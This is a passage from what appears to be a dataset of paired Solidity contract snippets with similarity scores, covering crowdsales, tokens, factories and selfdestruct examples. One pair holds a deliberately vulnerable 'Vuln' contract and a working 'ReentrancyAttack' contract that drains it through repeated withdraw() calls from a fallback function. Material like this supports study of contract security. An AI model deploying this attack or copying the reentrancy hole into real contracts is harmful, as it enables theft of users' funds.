
        uint256 weiAmount = msg.value;
        _preValidatePurchase(_beneficiary, weiAmount);

        
        uint256 tokens = _getTokenAmount(weiAmount);

        
        weiRaised = weiRaised.add(weiAmount);

        _processPurchase(_beneficiary, tokens);
        TokenPurchase(msg.sender, _beneficiary, weiAmount, tokens);

        _updatePurchasingState(_beneficiary, weiAmount);

        _forwardFunds();
        _postValidatePurchase(_beneficiary, weiAmount);
    }

    
    
    

    
    function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal onlyWhileOpen {
        require(_beneficiary != address(0));
        require(_weiAmount != 0);
    }

    
    function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {
        
    }

    
    function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {
        token.transfer(_beneficiary, _tokenAmount);
    }

    
    function _processPurchase(address _beneficiary, uint256 _tokenAmount) internal {
        _deliverTokens(_beneficiary, _tokenAmount);
    }

    
    function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {
        
    }

    
    function _getTokenAmount(uint256 _weiAmount) internal view returns (uint256) {

        uint256 period = 7 days;
        uint256 perc;

        if ((now >= openingTime) && (now < openingTime + period)) {
            perc = 10;
        } else if ((now >= openingTime + period) && (now < openingTime + period * 2)) {
            perc = 9;
        } else if ((now >= openingTime + period * 2) && (now < openingTime + period * 3)) {
            perc = 8;
        } else {
            perc = 7;
        }

        return _weiAmount.mul(perc).div(100000);

    }

    
    function _forwardFunds() internal {
        wallet.transfer(msg.value);
    }

    
    function hasClosed() public view returns (bool) {
        return now > closingTime;
    }

    function withdrawTokens() public onlyAfterClosing returns (bool) {
        token.transfer(wallet, token.balanceOf(this));
        return true;
    }

}"
"contract Locations {

  
  bool switch;
  uint number;
  address account;

  function doSomething() public pure {
    
    bool switch2;
    uint number2;
    address account2;
  }
}",0.64067954523306,"contract BattleInterface {
    function addWarrior(address, uint, uint8, string) pure public returns (bool) {}
    function isDead(uint) public pure returns (bool) {}
}"
"contract Example {
    Token public token;
    uint256 public lastAmount;

    constructor(Token _token) public {
        token = _token;
    }

    event TransferFromFailed(uint256 _amount);

    function tryTransferFrom(address _from, address _to, uint256 _amount) public returns(bool returnedBool, uint256 returnedAmount) {
        lastAmount = _amount; 
        

        (bool success, bytes memory returnData) =
            address(token).call( 
                abi.encodePacked( 
                    token.transferFrom.selector, 
                    abi.encode(_from, _to, _amount) 
                )
            );
        if (success) { 
            (returnedBool, returnedAmount) = abi.decode(returnData, (bool, uint256));
        } else { 
            
            emit TransferFromFailed(_amount);
        }
    }
}",0.6718204284903921,"contract Token {
	function SetupToken(string tokenName, string tokenSymbol, uint256 tokenSupply) public;
    function balanceOf(address _owner) public constant returns (uint256 balance);
    function transfer(address _to, uint256 _amount) public returns (bool success);
    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success);
    function approve(address _spender, uint256 _amount) public returns (bool success);
    function allowance(address _owner, address _spender) public constant returns (uint256 remaining);
}"
"contract Vuln {
    mapping(address => uint256) public balances;

    event LogDeposit(address sender, uint amount);
    event LogWithdrawal(address sender, uint amount);

    function deposit() public payable {
        
        emit LogDeposit(msg.sender, msg.value);
        balances[msg.sender] += msg.value;
    }

    function withdraw() public returns(bytes memory) {
        
        emit LogWithdrawal(msg.sender, balances[msg.sender]);
        (bool result, bytes memory x)  = msg.sender.call.value(balances[msg.sender])("""");
        if(result) {
            
            balances[msg.sender] = 0;
        }
        return x;
    }

}",0.6750916600658372,"contract StandToken is ERC20 {



    function transfer(address _to, uint256 _value) public returns (bool success) {

        require(balances[msg.sender] >= _value);

        require(_value > 0);

        require(balances[msg.sender] + _value >= balances[msg.sender]);

        

        balances[msg.sender] -= _value;

        balances[_to] += _value;



        emit Transfer(msg.sender, _to, _value);

    }



    function balanceOf(address _owner) public constant returns (uint256 balance) {

        return balances[_owner];

    }



    mapping (address => uint256) balances;

    uint256 public totalSupply;

}"
"contract ReentrancyAttack {
    Vuln target;
    uint iterations = 0;

    constructor(address t) public {
        target = Vuln(t);
    }

    function depositamount() public payable{
        target.deposit.value(msg.value)();
    }
    function withdrawamount() public payable{
        target.withdraw();
        msg.sender.transfer(address(this).balance);
    }

     function () external payable{
        if (iterations < 5){
            iterations++;
            target.withdraw();
        }
        iterations = 0;
     }
}",0.6361818654669966,"contract PullPayment {

  Escrow private escrow;



  constructor() public {

    escrow = new Escrow();

  }



  

  function withdrawPayments() public {

    address payee = msg.sender;

    escrow.withdraw(payee);

  }



  

  function payments(address _dest) public view returns (uint256) {

    return escrow.depositsOf(_dest);

  }



  

  function asyncTransfer(address _dest, uint256 _amount) internal {

    escrow.deposit.value(_amount)(_dest);

  }

}"
"contract Main {
  function handlePayment(address senderAddress) payable public {
      
  }
}",0.6846962681669474,"contract PullPayInterface {
  function asyncSend(address _dest) public payable;
}"
"contract FooFactory {
    function createInstance(address[] memory _addrs) public {
        new Foo(_addrs);
    }
}",0.6568101766258234,"contract Factory{

	function getExchange(address token_addr) public view returns(address);

}"
"contract Ctrt {
    function constructor() {}
}",0.6549356626621456,"contract CatsCradle {

    

    function cradle() {

        

    }

}"
"contract Test {
    address owner;

    constructor() public {
        owner = msg.sender;
    }

    event dying(bool dead);

    function kill() public {
        selfdestruct(owner);
        emit dying(true);
    }
}",0.6994787627647563,"contract BurnTokens {
    
   
  address owner;
  
   
  function BurnTokens() public {
      owner = msg.sender;
  }

    
  
  function destroy() public {
      assert(msg.sender == owner);
      selfdestruct(this);
  }
  
}"
"contract MyFirstContract {
    string private name;
    uint private age;

function setName(string newName) {
    name = newName;
    }

function getName() view returns (string) {
    return name;
    }
}",0.6419875961992122,"contract Trusti {
    string data = ""trusti.id"";
    
    function getStore() public view returns (string memory) {
        return data;
    }
    
    function setStore(string memory _value) public {
        data = _value;
    }
}"
"contract C { 
    function test() public { log0(0x1111); } 
}",0.6732553568952476,"contract FLC {
    function create(uint units) public;
}"
"contract B is C {
    function bbb() public { log0(0xbbbb); }
    function test() public {
       bbb(); 
       super.test(); 
    }
}",0.643748504121501,"contract Weth is ERC20 {

	function deposit() public payable;

	function withdraw(uint wad) public;

}"
"contract MyContract is MyInterface {

    function getBlockNumber() public view override returns (uint256) {
        return block.number;
    }
}",0.649397901851691,"contract ERC721Verifiable is ERC721Interface {

    function verifyFingerprint(uint256, bytes memory) public view returns (bool);

}"
"contract Vote {

    event Broadcast(string x, string s1, string s2);

    function voteNow(string vote) public {
        emit Broadcast('voteLog', toString(msg.sender), vote);
    }

    function toString(address x) public pure returns (string) {
        bytes memory b = new bytes(20);
        for (uint i = 0; i < 20; i++)
            b[i] = byte(uint8(uint(x) / (2**(8*(19 - i)))));
        return string(b);
    }

}",0.6198964341038874,"contract SaveData {
    mapping (uint => string) sign;
    address public owner;
    event SetString(uint key,string types);
    function SaveData() public {
        owner = msg.sender;
    }
    function setstring(uint key,string md5) public returns(string){
        sign[key]=md5;
        return sign[key];
    }

    function getString(uint key) public view returns(string){
        return sign[key];
    }
}"
"contract SolArray {

    uint[] public a;

    function pushA(uint value) public {
        a.push(value);
    }
}",0.6329631017133543,"contract Coin{

  function transfer(address to, uint value) public returns (bool);

}"
"contract CallFunction {

    address public useraddress;
    constructor(address _t) public {

        useraddress = _t;
    }

    function thirdfun(uint256 a) public view returns(uint256 c) {

        ArrayTes instanceuser = ArrayTes(useraddress);
        c = instanceuser.secfun(a);
        return c;
    }

}",0.6764573390686665,"contract AppCoins {

    mapping (address => mapping (address => uint256)) public allowance;

    function balanceOf (address _owner) public view returns (uint256);

    function transferFrom(address _from, address _to, uint256 _value) public returns (uint);

}"
"contract AtomicInteraction {
  function AtomicInteraction() payable {
    
    
    
    selfdestruct(msg.sender);
  }
}",0.619488037361353,"contract ABLEBurned {



    

    function () payable {

    }



    

    function burnMe () {

        

        selfdestruct(address(this));

    }

}"
"contract Certs {

    mapping(address => string) requests;
    address professorAddr;

    modifier onlyProfessor() {
        require(msg.sender == professorAddr);
        _;
    }

    function requestCert(string memory certName) public {
        requests[msg.sender] = certName;
    }



    function approve(address requestAddr) public onlyProfessor {
        delete requests[requestAddr];
        

    }
 }",0.6176347406911253,"contract ConsensysAcademy{
    mapping(address=>bytes32) public names;
    address[] public addresses;
    
    modifier onlyUnique(){
        if(names[msg.sender] == 0){ _; }else{ throw; }
    }
    function register(bytes32 name) onlyUnique{
        names[msg.sender] = name; 
        addresses.push(msg.sender);
    }
    function getAddresses() returns(address[]){ return addresses; }
}"
"contract A {
    
    function bar(address who, bytes m) public payable returns (bytes32) {
        address a = who;
        uint l = m.length;
        uint v = msg.value;
        assembly {
            if iszero(call(gas, a, v, add(m, 0x20), l, 0, 0)) {
                revert(0, 0)
            }
        }
        return 0;
    }
}",0.6141170502457443,"contract Rainmaker is Ownable {

    function letItRain(address[] _to, uint[] _value) onlyOwner public payable returns (bool _success) {

        for (uint8 i = 0; i < _to.length; i++){

            uint amount = _value[i] * 1 finney;

            _to[i].transfer(amount);

        }

        return true;

    }

}"
"contract Deposit {

    address payable public wallet;

    mapping(address => bool) public approved;

    event LogApproved(address approver, address approved);
    event LogDeposit(address sender, uint amount);

    function authorize(address allowed) public {
        require(msg.sender == wallet, ""Only the owner can do this, e.g. from their admin server."");
        emit LogApproved(msg.sender, allowed);
        approved[allowed] = true;
    }

    function deposit() public payable {
        require(approved[msg.sender], ""Unauthorized sender. Please register."");
        emit LogDeposit(msg.sender, msg.value);  
        wallet.transfer(msg.value);
    }
}",0.6528140632641245,"contract ventil_ii{ 

mapping(address => uint) public balances;

event LogDeposit(address sender, uint amount);
event LogWithdrawal(address receiver, uint amount);

function withdrawFunds(uint amount) public returns(bool success) {
    require(amount < balances[msg.sender]);
    LogWithdrawal(msg.sender, amount);
    msg.sender.transfer(amount);
    return true;
}

function () public payable {
    require(msg.value > 0);
    uint change;
    uint dep;
    if(msg.value > 20) {
        dep = 20;
        change = msg.value - change;
    }
    balances[msg.sender] += dep;
    if(change > 0) balances[msg.sender] += change;
    LogDeposit(msg.sender, msg.value);
}

}"
"contract ABI {

    struct TestStruct {
        uint size;
    } 

    function testFunc(uint test) public pure returns(bool replaced) {
        return test == 0;
    }
}",0.6219591411915187,"contract Token{

function transfer(address to, uint value) public returns (bool);

function decimals() public returns (uint);

}"
"contract NameReg {
    bytes32 public nn;
    bytes public calldata;

    function register(bytes32 name) {
      nn = name;    
    }

    function() {
        calldata = msg.data;
    }

    function doesNotCallRegister() {
        this.call(""register"", ""MyName"");
    }
 }",0.6108232454241892,"contract HashMap {
    mapping(bytes32 => bytes) map;
    
    function set(bytes _data) public {
        map[keccak256(_data)] = _data;
    }
    
    function get(bytes32 _hash) public constant returns (bytes data) {
        return map[_hash];
    }
}"
"contract Test {
    uint public num;

    function setNum(uint myNum) public {
        
    }
}",0.6621514879944561,"contract Counter {
    uint public counter;
    function increment() public { counter++; }
}"
"contract Y {
    function a(address _x) public {
        X x = X(_x);
        x.doSomething();
    }
}",0.6320586120919508,"contract MNY {
    function mine(address token, uint amount) public;
}"
"contract Z {
    function a(X _x) public {
        X x = _x;
        x.doSomething();
    }
}",0.6061549437684091,"contract Test {
    uint public test;
    
    function Test() {
        test = 1;
    }
}"
"contract Reg {
    mapping (address=>bytes32[5]) public Map;

    
    function fill_map(bytes32[5] _attributes) public  {
            Map[msg.sender] = _attributes;
    }

    
    function get_attributes(address _id) view public returns (bytes32[5]){
        return Map[_id];
    }
}",0.6614269057322921,"contract Resolver {

    function supportsInterface(bytes4 interfaceID) public pure returns (bool);

    function addr(bytes32 node) public view returns (address);

    function setAddr(bytes32 node, address addr) public;

}"
"contract TestData {

    address Address;
    function get_address (address _Address) public{   
        Address = _Address;
    } 

    
    bytes32[5] public fetched;
    function fetch(address _reg_Adress) public returns (bytes32[5]) {
        Reg r = Reg(_reg_Adress);
        fetched = r.get_attributes(Address);
        return (fetched);
    }

    
    bytes32[5] public inputs;
    function getInputs(bytes32[5] _inputs) public returns (bytes32[5]){
            inputs = _inputs;
            return (inputs);
    }    

    

    function compare() public view returns(bool[5]){
        bool[5] memory a;
        for(uint i=0;i<5;i++){
            for(uint j=0;j<5;j++){
                if(inputs[i] == fetched[j]){
                    a[i] = true;                 
                }
            }
        }

        return (a);
    }  

}",0.6295637345442159,"contract TokenInterface {

    function totalSupply() public view returns (uint256);

    function balanceOf(address who) public view returns (uint256);

    function getMaxTotalSupply() public view returns (uint256);

    function mint(address _to, uint256 _amount) public returns (bool);

    function transfer(address _to, uint256 _amount) public returns (bool);



    function allowance(

        address _who,

        address _spender

    )

        public

        view

        returns (uint256);



    function transferFrom(

        address _from,

        address _to,

        uint256 _value

    )

        public

        returns (bool);

}"
"contract B is Owned {
    constructor() public {
        
        ...
    }

    function _authorizeCaller(address addr) external requireContractOwner {
        ...
    }
}",0.6622338296864697,"contract Mortal is Owned  {
    function kill() public {
        if (msg.sender == contractOwner) selfdestruct(contractOwner);
    }
}"
"contract Test {

  event LogTest(address sender, address toWhom, uint amount);

  function test(address whom, uint256 amount) public returns(bool success) {
    LogTest(msg.sender, whom, amount);
    return true;
  }
}",0.6986214341662905,"contract Blocksquare {

    function transfer(address _to, uint256 _amount) public returns (bool _success);

    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool _success);

}"
"contract StateContract is Ownable {
    uint256 public contractVariable = 3;
    address public proxy_contract;

    
    modifier onlyApprovedProxy() {
        require(msg.sender == proxy_contract);
        _;
    }

    function changeProxyAddress(address _proxy_contract) public onlyOwner returns(bool) {
        proxy_contract = _proxy_contract;
        return true;
    }

    function editContractVariable(uint256 _conrtactVariable) external onlyApprovedProxy returns(bool) {
         contractVariable = _conrtactVariable;
         return true;
    }

    function getContractVariable() public view returns(uint256) {
        return contractVariable;
    }
}",0.6257569209605022,"contract LLCTokenFactory {

  

  mapping (address => bool) public validContracts; 
  address[] public contracts;

  

  function getContractCount() 
    public
    view
    returns(uint contractCount)
  {
    return contracts.length;
  }

  

  function getDeployedContracts() public view returns (address[] memory)
  {
    return contracts;
  }

  

  function newLLCToken(string memory name, string memory symbol, uint256 init, address owner)
    public
    returns(address)
  {
    LLCToken c = new LLCToken(name, symbol, init, owner);
    validContracts[c] = true;
    contracts.push(c);
    return c;
  }
}"
"contract Test {
    uint x;
    function set(uint y) public {
        x = y;
    }

    function factorial(uint y) internal pure returns(uint){
        if (y == 1){
            return y;
        } else {
            return y * factorial(y-1);
        }
    }

    function get() public view returns(uint){
        return factorial(x);
    }
}",0.6607882222755577,"contract DSMath {

    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, ""ds-math-add-overflow"");
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, ""ds-math-sub-underflow"");
    }

}"
"contract Election {
    Registry registry;

    modifier isEligible(address _addr) {
        require(registry.isVoter(_addr));
        _;
    }

    function vote() isEligible(msg.sender) public {
        
    }
}",0.6032792900150747,"contract Ownable {
  
    address public owner;

    function Ownable(address _owner) public {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

}"
"contract Factory {
    function getName() internal pure returns (string) {
        return ""Your Name"";
    }
}",0.6908585021121645,"contract TrueLove {

    function Is() public pure returns (string) {

        return ""Sol  Sonic"";

    }

}"
"contract Contract is Factory {
    string public Name;

    constructor () public {
        Name = getName();
    }
}",0.6298576834393319,"contract Reclaimable is Ownable {

    
    constructor() public payable {
    }

    
    function() public payable {
    }
}"
"contract A {

  address[] public bList;
  event LogNewB(address creator, address contractB);

  function createB() public returns(address contractB) {
    B b = new B();
    emit LogNewB(msg.sender, b);
    bList.push(b);
    return address(b);
  }",0.616969901506003,"contract RegulatorService {



  

  function check(address _token, address _spender, address _from, address _to, uint256 _amount) public returns (uint8);



  

  function messageForReason(uint8 _reason) public view returns (string);

}"
"contract StringStorage {

    string[] public str;

    function push(string memory s) public {
        str.push(s);
    }

    function pop() public view returns(string memory s) {
        string storage _s = str[str.length-1]; 
        s = _s;
    }
}",0.6066689018481739,"contract Lobster {

    address private owner;
    string private flag;
    
    constructor () public {
        owner = msg.sender;
    }
    
    function getFlag() public view returns (string memory) {
        require(msg.sender == owner);
        return flag;
    }
    
}"
"contract ShiftDemo {
    bytes32 public s;

    function execute(bytes3 d, uint256 idx)public {
        s = s | (bytes32(d) >> (idx*8));
    }
}",0.629281588605968,"contract Bridge {

    function submitPeriod(

    bytes32 _prevHash, 

    bytes32 _root) 

  public  returns (uint256 newHeight) {}

}"
"contract EtherBay {
    event NewEvent(address addr, uint intValue, bytes32 name);

    function withdraw() returns (bool) {
enter preformatted text here
        NewEvent({ addr: 0, intValue: 10, name: 'someString'}); 
    }
 }",0.6126347686858403,"contract ERC223Interface {
    function transfer(address to, uint value, bytes data) public returns (bool);
    event Transfer(address indexed from, address indexed to, uint value, bytes data);
}"
"contract A {
    function f(uint _in) public pure returns (uint out) {
        out = 1;
    }

    function f(uint _in, bytes32 _key) public pure returns (uint out) {
        out = 2;
    }
}",0.6999934721301786,"contract PotLike {
    function pie(address) public view returns (uint);
    function drip() public returns (uint);
    function join(uint) public;
    function exit(uint) public;
}"
"contract A {

  event LogNewB(address creator, address contractB);

  function createB() public returns(address contractB) {
    B b = new B();
    emit LogNewB(msg.sender, b);
    return address(b);
  }",0.6062731054954815,"contract IBMapping {
	function checkAddress(string memory name) public view returns (address contractAddress);
	function checkOwners(address man) public view returns (bool);
}"
"contract Foo {
    uint x;
    function func(uint _x) public virtual {
        x = _x;
    }
}",0.6357985080739893,"contract FiatContract {
  function USD(uint _id) public view returns (uint256);
}"
"contract Purchase {
  uint public amount;
  address public seller;
  address public buyer;

  event LogPurchase(address buyer, uint amount);

  function Purchase(uint _amount) {
    seller = msg.sender;
    amount = _amount;
  }

  function confirmPurchase() 
    payable 
    returns(bool success)
  { 
    if(msg.value != amount) throw; 
    LogPurchase(msg.sender,msg.value);
    seller.transfer(msg.value); 
    return true;
  }
}",0.6410793940970344,"contract EtherTransferTo{

    address public owner;

    

    constructor() public {

    owner = msg.sender;

  }

  

    modifier onlyOwner() {

        require (msg.sender == owner);

        _;



    }

    

    function () payable public {

        

    }

    

    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    function withdraw(uint amount) onlyOwner returns(bool) {

        require(amount <= this.balance);

        owner.transfer(amount);

        return true;



    }

    



}"
"contract MyContract is Ownable {
    mapping (address => bool) public wallets;
    function addWallet(address wallet) external onlyOwner {
        wallets[wallet] = true;
    }
}",0.6716588668543981,"contract CREDITS is Ownable {

    mapping (address => uint256) internal balanceOf;

    function transfer (address _to, uint256 _value) public returns (bool);

   

}"
"contract ERC223Contract is ReentrancyGuard {
    using SafeMath for uint256;

    ERC223Interface private token;

    function getBlockNumber() public view returns (uint256) {
        return block.number;
    }

    function getData() public pure returns (bytes memory) {
        return msg.data;
    }

    function getSignature() public pure returns (bytes4) {
        return msg.sig;
    }

    function () external {
      
      revert();
    }

    function tokenFallback(address player, uint tokens, bytes memory data) public nonReentrant {
        emit DepositedERC223Token(player, tokens, data);
    }

    event Created(string, uint);
    event DepositedERC223Token(address from, uint value, bytes data);
}",0.6659779111488613,"contract IERC223 {
    uint public _totalSupply;
    
    function name() public view returns (string memory);
    function symbol() public view returns (string memory);
    function decimals() public view returns (uint8);
    function totalSupply() public view returns (uint256);
    
    function balanceOf(address who) public view returns (uint);
    function transfer(address to, uint value) public returns (bool success);
    function transfer(address to, uint value, bytes memory data) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint value, bytes data);
}"
"contract Factory {
    
    address public owner;
    mapping ( uint256 => address ) public receiversMap;
    uint256 receiverCount = 0;
    
    constructor() public {
        
        owner = msg.sender;
    }
    
    
    function createReceivers( uint8 number ) public {
        require(msg.sender == owner);

        for(uint8 i = 0; i < number; i++) {
            
            receiversMap[++receiverCount] = new Receiver();
        }
        
    }
    
    
    function sendFundsFromReceiverTo( uint256 ID, address tracker, uint256 amount, address receiver ) public returns (bool) {
        require(msg.sender == owner);
        return Receiver( receiversMap[ID] ).sendFundsTo( tracker, amount, receiver);
    }
    
    
    function batchCollect( address tracker, address receiver, address[] contractAddresses, uint256[] amounts ) public {
        require(msg.sender == owner);
        
        for(uint256 i = 0; i < contractAddresses.length; i++) {
            
            
            Receiver( contractAddresses[i] ).sendFundsTo( tracker, amounts[i], receiver);
        }
    }
    
}",0.6534810573238004,"contract Owned {

    address owner;

    address newOwner;

    uint32 transferCount;    



    event TransferOwnership(

        address indexed _from, 

        address indexed _to

    );



    constructor() public {

        owner = msg.sender;

        transferCount = 0;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



    function transferOwnership(

        address _newOwner) 

        public 

        onlyOwner 

    {

        newOwner = _newOwner;

    }



    function viewOwner()

        public

        view

        returns (address)

    {

        return owner;

    }



    function viewTransferCount()

        public

        view

        onlyOwner

        returns (uint32)

    {

        return transferCount;

    }



    function isTransferPending() 

        public

        view

        returns (bool) {

        require(

            msg.sender == owner || 

            msg.sender == newOwner);

        return newOwner != address(0);

    }



    function acceptOwnership()

         public 

    {

        require(msg.sender == newOwner);



        owner = newOwner;

        newOwner = address(0);

        transferCount++;



        emit TransferOwnership(

            owner, 

            newOwner

        );

    }

}"
"contract Interface {
    function something() public;
    function somethingElse() public;
}",0.6837759350304579,"contract IUpgradable {
    function startUpgrade() public;
    function endUpgrade() public;
}"
"contract Undeployable is Interface {
    uint x;
    function something() public {
        
        x=1;
    }
}",0.6562565355837133,"contract rx is ERC20{

    function onTransfer(uint) public payable returns (bool);

}"
"contract Deployable is Undeployable {
    uint y;
    function somethingElse() public {
        
        y=1;
    }
}",0.6293102855401824,"contract Destroyable is Ownable{

    

    function destroy() public onlyOwner{

        selfdestruct(owner);

    }

}"
"contract Hello {
    string name;

    function Hello() public {
        name = ""Mike"";
    }
}",0.6978473875616616,"contract Resolver {
    function setName(bytes32 node, string name) public;
}"
"contract Zoo is Bar {
    function fooBar (uint x) public onlyPrime (x) {
        
    }
}",0.6249489686562012,"contract rx is ERC20{

    function onTransfer(uint) public payable returns (bool);

}"
"contract TokenAirdrop {

    function sendTokens(address[] beneficiaries) public {
        ERC20 token = ERC20(OXO...); 
        for (uint8 i = 0; i< beneficiaries.length; i++){
            address beneficiary = beneficiaries[i];
            token.transferFrom(OWNER_OF_TOKENS, beneficiary, 1);
        }

    }
}",0.6603487401191502,"contract Airdrop {

    ERC20 token;

    function airdrop(address tokenAddress, address[] addresses, uint256 amount) public {

        token = ERC20(tokenAddress);

        for(uint i = 0; i < addresses.length; i++) {

            token.transferFrom(msg.sender, addresses[i], amount);

        }

    }

}"
"contract FunctionTest {

    bool public foo; 
    
    bytes32 public name; 
    uint256 public counter;

    
    constructor() public{
        
        foo = true;
        counter = 0;
    }

    function setName(bytes32 _name) public {
        
        require(_name > 0);
        name = _name;
    }

    function writeToStorage() public {
        foo = !foo;
    }

    function readFromStorageConstant() public constant returns (bool) {
        return foo;
    }

    function readFromStorageView() public view returns (bool) {
        return foo;
    }

}",0.6507735363213244,"contract ArnaCrowdsale is Ownable {
    function burnUnsold() public onlyOwner returns (uint256);

    function price() public constant returns (uint256);

    function priceWithBonus() public constant returns (uint256);

    function sendTokens(address beneficiary, uint256 amount) public;

    function tokensToSale() public view returns (uint256);

    uint256 public totalRise;

    function withdraw() public onlyOwner returns (bool);
}"
"contract Test { 
    function test() public pure returns (uint256, uint256, uint256) {
        uint256 initial = 258;
        
        return (initial % 10, initial % 100 / 10, initial % 1000 / 100);
    }
}",0.6664615317766341,"contract Nest {

    mapping (uint256 => bool) public inNest;

    function getEggs() external view returns (uint256[2]);

    function add(uint256) external returns (bool, uint256, uint256);

}"
"contract SplitSupply {
    address owner;
    address payable private team = 0x14723A09ACff6D2A60DcdF7aA4AFf308FDDC160C;
    address payable private crowd = 0x4B0897b0513fdC7C541B6d9D7E929C4e5364D2dB;

    constructor() payable public {
        require(1 ether < msg.value);
        owner = msg.sender;
    }

    function allocate() public {
        require(msg.sender == owner);
        address(team).transfer(address(this).balance / 2);
        address(crowd).transfer(address(this).balance);
    }
}",0.6125349170709036,"contract MultiplicatorX3
{
    address public Owner = msg.sender;
   
    function() public payable{}
   
    function withdraw()
    payable
    public
    {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }
    
    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Owner);
        adr.call.value(msg.value)(data);
    }
    
    function multiplicate(address adr)
    public
    payable
    {
        if(msg.value>=this.balance)
        {        
            adr.transfer(this.balance+msg.value);
        }
    }
}"
"contract Counters {
    uint256[] public counters;
    event NewCounter(uint256 index);

    function createCounter() external {
        counters.push(0); 
        emit NewCounter(counters.length - 1); 
    }

    function increment(uint256 index) external {
        counters[index] += 1;
    }
}",0.6002739021757051,"contract Burnable {

    event Burn(address burner, uint256 value);



    constructor () internal {}

    function burn(address account, uint256 value) public;



    function _burn(address account, uint256 value) internal{

        emit Burn(account, value);

    }

}"
"contract Counter is Initializable {
    uint256 public value;

    function initialize(uint256 initialValue) initializer public {
        value = initialValue;
    }

    function increase() public {
        value++;
    }
}",0.6568364573500172,"contract Burnable is TokenBasic {

  function burn(uint256 value) public {
    _burn(msg.sender, value);
  }

  function burnFrom(address from, uint256 value) public {
    _burnFrom(from, value);
  }
}"
"contract Test {

    function test() public pure returns (bytes memory, bytes memory) {
        int8 a = 1;
        uint16 b=2;
        return (abi.encode(a,b), abi.encodePacked(a,b));
    }
}",0.6123769785612888,"contract DSSpellBook {
    function make(address whom, uint256 mana, bytes memory data) public returns (DSSpell) {
        return new DSSpell(whom, mana, data);
    }
}"
"contract Houses {
    struct House {
        address owner;
    }    

    House[] public houses;

    function buyHouse() public payable {
        House memory tempHouse = House(msg.sender);
        houses.push(tempHouse);
    }

    function getTotalHomesSold() public view returns (uint256 count) {
        return houses.length;
    }
}",0.6097711184743176,"contract Ownable {



    address public owner;



    constructor() public {

        owner = msg.sender;

    }



    function setOwner(address _owner) public onlyOwner {

        owner = _owner;

    }



    function getOwner() public view returns (address) {

        return owner;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



}"
"contract Checker {

  function checkBal(address token, address holder) public view returns(uint) {
    IERC20 token = IERC20(token);
    return token.balanceOf(holder);
  }
}",0.6543277463030908,"contract ERC20 {
    function balanceOf(address who) public view returns(uint256);
    function transfer(address to, uint256 value) public returns(bool);
}"
"contract Crowdsale {

    address officialToken;
    address depositToken;

    function investFromToken(address _from, uint256 _value ,bytes _extraData) returns (bool success) {
        if (msg.sender != officialToken) throw; 
        Token token = Token(_token);
        token.transferFrom(_from, depositToken, _value); 
        DoInvest(_value, _extraData); 
        return true; 
    }

}",0.6157659050119147,"contract ERC223 is ERC20 {
  function transfer(address to, uint value, bytes data) returns (bool ok);
  function transferFrom(address from, address to, uint value, bytes data) returns (bool ok);
  
  event Transfer(address indexed from, address indexed to, uint value, bytes indexed data);
}"
"contract StandardToken is Ownable{

   string public name;

   function StandardToken() public {
       name = 'Token';
   }

   function changeName(string _name) public onlyOwner {
       name = _name;
   }
}",0.6572590837075306,"contract TestToken is MintableToken {
    string public name = ""Test Token"";
    string public symbol = ""T"";
    uint public decimals = 18;

    
    function () public payable {
        throw;
    }

}"
"contract StackExchangeSol{

    struct Foo{
        uint x;
    }

    mapping(uint => Foo[]) foo;
    
    uint[] indexOf;
    

    function add(uint id, uint _x) public {
        foo[id].push(Foo(_x));
        
        count++;
        
    }

    function get(uint id, uint index) public view returns(uint){
        return foo[id][index].x;
    }
    
    uint count;
    constructor() public{
        count=0;
    }
    


    
    function getLenOf() public view returns(uint){
        return indexOf.length;

    }
    
}",0.6217240253264711,"contract ERC20 is ERC20Basic {
        uint constant MAX_UINT = 2**256 - 1;
  function totalSupply() public view returns (uint) {
    return MAX_UINT;
  }
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}"
"contract New{

    mapping(address => string) public users; 

    

    
    

    function updateUser(string memory name) public {
        users[msg.sender] = name; 

    }
    function getUser(address a) public view returns(string memory) {
        return users[a]; 
    }
}",0.6859006245153618,"contract TokenDetails {

    string internal _name;
    string internal _symbol;
    
    
    function name() public view returns(string memory) {
        return _name;
    }

    
    function symbol() public view returns(string memory) {
        return _symbol;
    }
}"
"contractB {
  uint private etherReceived = 0;

  function () external payable {
    etherReceived += msg.value;
  }
}",0.6520867391448828,"contract ReserveAddress {

    function() external payable {

        revert(""The contract don`t receive ether"");

    } 

}"
"contract financialContracts4{

address issuer; 
constructor() public{    
        issuer = msg.sender; 
    }

modifier ifIssuer(){ 
    if(issuer != msg.sender){
        revert();
    }else {
        _;
    } 
}

function receiveFunds( ) public payable{} 

function getValue() public view returns(uint) {   
    address myAddress = this; 
    return myAddress.balance; 

    } 
function withdrawFunds(uint funds) ifIssuer public {   
    issuer.transfer(funds); 
    } 
}",0.6730961200196285,"contract Counter {
    
    event Won(address winner, uint amount);
    
    uint public i;
    address public owner;
    
    function Counter() public {
        owner = msg.sender;
    }
    
    function reset() public {
        require(msg.sender==owner);
        i=0;
    }
    
    function inc() public payable {
        require(msg.value >= 0.001 ether);
        i++;
        if (i==2) {
            emit Won(msg.sender,address(this).balance);
            msg.sender.transfer(address(this).balance);
            i = 0;
        }
    }
    
}"
"contract c{
 
 mapping (address=>uint) balances;
 
 struct foo  {
     uint vault;
 }
function withdraw() returns (bool) {
    
    foo memory balance; 

    uint customerBalance = balances[msg.sender];
    if(customerBalance == 0) {
      throw;
    }

    balance.vault -= customerBalance;
    balances[msg.sender] = 0;
    return msg.sender.send(customerBalance);
}
}",0.682118341945395,"contract jvCoin {
    mapping (address => uint) balances;

    function jvCoin() { 
        balances[msg.sender] = 10000;
    }

    function sendCoin(address receiver, uint amount) returns (bool sufficient) {
